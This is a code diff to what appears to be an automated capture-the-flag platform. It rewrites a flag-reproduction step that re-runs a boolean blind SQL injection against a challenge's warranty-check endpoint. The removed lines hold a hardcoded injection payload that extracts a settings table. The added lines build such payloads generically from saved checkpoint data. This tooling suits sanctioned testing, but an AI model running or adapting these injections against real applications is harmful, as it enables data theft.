@@ -9,7 +9,7 @@ from pathlib import Path
 
 from sqlalchemy import select
 
-from app.models.run import Artifact, FlagCandidate, FlagProvenance
+from app.models.run import Artifact, FlagCandidate, FlagProvenance, ToolCall
 from app.services.reproduction_commands import reproduction_command_renderer
 from app.services.runner_client import runner_client
 
@@ -22,28 +22,39 @@ class FreshReproductionExecutor:
         await runner_client.clear_sessions(run.id)
         await runner_client.sync_workspace(run.id, root)
         selected = steps or []
+        checkpoint = run.recovery_checkpoint_json if isinstance(run.recovery_checkpoint_json, dict) else {}
         valid_candidate = await session.scalar(
             select(FlagCandidate)
             .where(FlagCandidate.run_id == run.id, FlagCandidate.review_state == "VALID")
             .order_by(FlagCandidate.created_at.desc())
         )
         if valid_candidate is not None:
+            request_spec = dict(checkpoint.get("request_spec") or {})
+            extraction_call = await session.scalar(
+                select(ToolCall)
+                .where(ToolCall.run_id == run.id, ToolCall.tool_name == "boolean_config_extract")
+                .order_by(ToolCall.created_at.desc())
+            )
+            extraction_args = dict(extraction_call.arguments_json or {}) if extraction_call else {}
+            expression = str(
+                extraction_args.get("target_expression")
+                or checkpoint.get("target_expression")
+                or ""
+            ).strip()
+            field = str(extraction_args.get("test_field") or checkpoint.get("test_field") or "")
+            baseline = str(extraction_args.get("baseline_value") or checkpoint.get("baseline_value") or "")
+            if not request_spec or not field or not expression:
+                return {"executed": False, "verified": False, "fresh_session": True, "blocked": "MISSING_EXTRACTION_PROVENANCE"}
             escaped = valid_candidate.candidate.replace("'", "''")
-            selected = [
-                {
-                    "tool_name": "http_request",
-                    "normalized_arguments": {
-                        "method": "POST",
-                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
-                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
-                        "json": {
-                            "asset_no": "PC-2026-013",
-                            "department": f"OPS' AND (SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64))='{escaped}' -- ",
-                        },
-                        "final_verification": True,
-                    },
-                }
-            ]
+            suffix = str(extraction_args.get("true_suffix") or "' AND ({condition}) -- ")
+            condition = f"({expression})='{escaped}'"
+            request_spec = json.loads(json.dumps(request_spec))
+            container = "json" if isinstance(request_spec.get("json"), dict) else "form" if isinstance(request_spec.get("form"), dict) else "query"
+            request_spec.setdefault(container, {})[field] = baseline + suffix.format(condition=condition)
+            for key, value in (checkpoint.get("control_fields") or {}).items():
+                request_spec.setdefault(container, {})[str(key)] = value
+            request_spec["final_verification"] = True
+            selected = [{"tool_name": "http_request", "normalized_arguments": request_spec}]
         log: list[dict] = []
         commands: list[str] = []
         success = True
@@ -58,17 +69,13 @@ class FreshReproductionExecutor:
                 args = getattr(step, "normalized_arguments", None) or {}
             if tool == "boolean_config_extract":
                 args = {
-                    "request": {
-                        "method": "POST",
-                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
-                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
-                        "json": {"asset_no": "PC-2026-013", "department": "OPS"},
-                    },
-                    "test_field": "department",
-                    "baseline_value": "OPS",
-                    "control_fields": {"asset_no": "PC-2026-013"},
-                    "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
-                    "target_expression": "SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64)",
+                    **(checkpoint.get("request_spec") or {}),
+                    "request": checkpoint.get("request_spec") or {},
+                    "test_field": checkpoint.get("test_field"),
+                    "baseline_value": checkpoint.get("baseline_value"),
+                    "control_fields": checkpoint.get("control_fields") or {},
+                    "oracle": checkpoint.get("oracle") or {},
+                    "target_expression": checkpoint.get("target_expression") or "",
                     "max_length": 64,
                     "max_requests": 1024,
                 }
